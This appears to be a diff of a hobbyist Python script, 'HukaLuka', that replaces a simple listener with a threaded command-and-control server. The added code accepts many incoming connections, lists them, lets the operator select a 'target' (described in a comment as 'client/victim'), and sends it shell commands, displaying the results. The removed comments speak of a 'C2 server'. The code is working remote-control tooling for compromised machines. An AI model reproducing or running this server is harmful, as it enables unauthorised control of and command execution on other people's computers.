@@ -1,28 +1,10 @@
-#! /usr/bin/env python3
+#!/usr/bin/python3
 
-# ASK HOW TO REUPLOAD CHANGES TO GITHUB REPO FOR THIS FILE ONLY?
-
-import subprocess
 import socket
 import sys
-
-HOST = '0.0.0.0' # does this need to be our C2 server?
-PORT = 5555 # random port it does not matter
-
-# socket that waits for incoming connection
-s = socket.socket()
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((HOST, PORT))
-s.listen(1)
-print(f'[*] listening as {HOST}:{PORT}')
-
-# waiting for the target and sent a welcome message if it connected
-client_s, client_addr = s.accept()
-print(f'[*] client connected {client_addr}')
-#client_s.send('welcome'.encode())
-
-# custom menu option for us
-print("\nWelcome to HukaLuka!\n")
+import threading
+import time
+from queue import Queue
 
 '''
 print(''
@@ -38,60 +20,174 @@ print(''
 '\n******************************************************************\n')
 '''
 
-def menu():
-    print("[1] ls")
-    print("[2] hostname")
-    print("[3] ip a")
-    print("[0] Exit the program.")
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_address = []
 
-menu()
-option = int(input("\nEnter your option: "))
+# creating socket that will connect computers
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = "0.0.0.0"
+        port = 5555
+        s = socket.socket()
 
-l1 = subprocess.run(['ls'], stdout=subprocess.PIPE, text=True)
-l2 = subprocess.run('hostname', stdout=subprocess.PIPE, text=True)
-l3 = subprocess.run(['ip', 'a'], stdout=subprocess.PIPE, text=True)
+    except socket.error as msg:
+        print("socket creation error: " + str(msg))
 
 
-while option != 0:
-    if option == 1:
-        # use the ls command
-        print()
-        print(l1.stdout)
-    elif option == 2:
-        # run hostname
-        print()
-        print(l2.stdout)
-    elif option == 3:
-        # run ip a
-        print()
-        print(l3.stdout)
-    else:
-        print("\nInvalid option.\n")
+# bind socket and listen for connections
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+        #print("Binding the Port: " + str(port))
+        print("[*] listening as " + str(host) + ':' + str(port))
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((host, port))
+        s.listen(5)
 
-    #print()
-    menu()
-    option = int(input("\nEnter your option: "))
+    except socket.error as msg:
+        print("socket Binding error" + str(msg) + "\n" + "retrying...")
+        bind_socket()
 
-print("\nThanks for using HukaLuka!")
+# accept multiple connections
+# save them to a list
+# close previous connections upon server file restart
 
-'''
-# this loop will run, until you enter 'quit'
-while True:
+def accepting_connections():
+    for c in all_connections:
+        c.close()
 
-    # 1. enter the command and send it to the target
-    cmd = input('Enter command: ')
-    client_s.send(cmd.encode())
+    del all_connections[:]
+    del all_address[:]
 
-    # check if you want to quit
-    if cmd.lower() == 'quit':
-        break
-    elif cmd.lower() == 'exit':
-        break
+    while True:
+        try:
+            conn, address = s.accept()
+            s.setblocking(1)  # prevents timeout
 
-    # get the result of the command, executed on the target pc
-    result = client_s.recv(1024).decode()
-    print(result)
-'''
+            all_connections.append(conn)
+            all_address.append(address)
 
-client_s.close()
-s.close()
+            print("connection has been established: " + address[0])
+            #print("Client connected "
+
+        except:
+            print("error accepting connections")
+
+
+# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
+# Interactive prompt for sending commands
+# luka> list
+# 0 Friend-A Port
+# 1 Friend-B Port
+# 2 Friend-C Port
+# luka> select 1
+# 192.168.0.112> dir
+
+
+def start_luka():
+
+    while True:
+        cmd = input('luka> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+
+        else:
+            print("command not recognized")
+
+
+# Display all current active connections with client
+
+def list_connections():
+    results = ''
+
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_address[i]
+            continue
+
+        results += '| ' + str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + ' |' + "\n"
+
+    print("\n-------clients-----------" + "\n" + results)
+
+
+# Selecting the target
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '')  # target = id
+        target = int(target)
+        conn = all_connections[target]
+        print("you are now connected to: " + str(all_address[target][0]))
+        print(str(all_address[target][0]) + ">", end="")
+        return conn
+        # 192.168.0.4> dir
+
+    except:
+        print("selection not valid")
+        return None
+
+
+# Send commands to client/victim or a friend
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                break
+            if cmd == 'exit':
+                break
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end="")
+        except:
+            print("Error sending commands")
+            break
+
+
+# Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+
+# Do next job that is in the queue (handle connections, send commands)
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connections()
+        if x == 2:
+            start_luka()
+
+        queue.task_done()
+
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+
+    queue.join()
+
+
+create_workers()
+create_jobs()
